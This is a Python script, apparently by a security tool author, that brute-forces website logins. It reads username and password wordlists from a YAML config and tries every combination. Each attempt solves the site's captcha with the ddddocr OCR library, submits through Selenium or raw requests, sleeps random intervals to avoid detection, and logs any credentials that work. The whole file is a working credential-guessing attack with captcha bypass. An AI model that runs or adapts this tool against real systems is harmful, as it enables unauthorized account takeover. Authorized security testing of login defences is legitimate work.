'''
selenium版本
    pip show selenium
        Name: selenium
        Version: 4.5.0
explain: 调用ddddocr识别API
author: s1g0day
time: 2023/12/20
version: '0.1'
'''

import yaml
import time
import random
from argparse import ArgumentParser
from modules.picture import picture_main
from modules.alertlog import alertlog_main
from modules.selenium_set import selenium_main
from modules.login_request import login_request_main
from modules.login_selenium import login_selenium_main
from modules.ddddocr_captcha import ddddocr_captcha_main


# 登录任务
def main(username, password, config, i, j):
    
    # 初始化selenium
    browser = selenium_main(config)
    
    # 获取二维码图片
    # print('------------开始获取二维码图片---------------')
    VerifyCode = picture_main(config["url"], browser, config["captcha_update_xpath"])
    time.sleep(random.random()*4)
    
    # 开始识别二维码
    # print('------------开始识别二维码-------------------')
    res = ddddocr_captcha_main(VerifyCode)
    res.replace(" ", "")
    time.sleep(random.random()*4)
    '''
    目前已知的几种登录情况:
    1.登录加密,可以找到加密函数，requests
    2.登录加密,无法找到加密函数, selenium
    3.登录不加密,requests
    '''
    if res:
        print('------------开始登录测试---------------------')
        login_user = username[i].rstrip('\n')
        login_passwd = password[j].rstrip('\n')

        if config['login_config']=="selenium":
            alert, user, passwd = login_selenium_main(login_user, login_passwd, res, browser, config)

        elif config['login_config']=="requests":
            # 使用 requests 时注意账密是否是加密状态，编写相应的加解密代码
            alert, user, passwd = login_request_main(login_user, login_passwd, res, config)

        # 记录日志
        if alert:
            alertlog_main(config, alert, user, passwd, res, VerifyCode)

    browser.quit()

# 主函数
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-c", dest="config_file", required=True, help="Please enter the config_file,for example config\config.yaml")
    # parser.add_argument("-t", dest="thread_count", type=int, default=100, required=True, help="Please enter the thread number")
    args = parser.parse_args()
    # 加载配置
    config = yaml.safe_load(open(args.config_file, "r", encoding="utf-8").read())
    
    username = []
    password = []

    with open(config["username"], 'r') as f:
        username = f.readlines()
    with open(config["password"], 'r') as f:
        password = f.readlines()
    for i in range(0,len(username)):
        for j in range(0,len(password)):
            print(f"当前第{i}行账户第{j}行密码, 剩余{len(username)-i}个账户, {len(password)-j}个密码")
            main(username, password, config, i, j)
    print('------------字典已跑完，程序退出-------------')
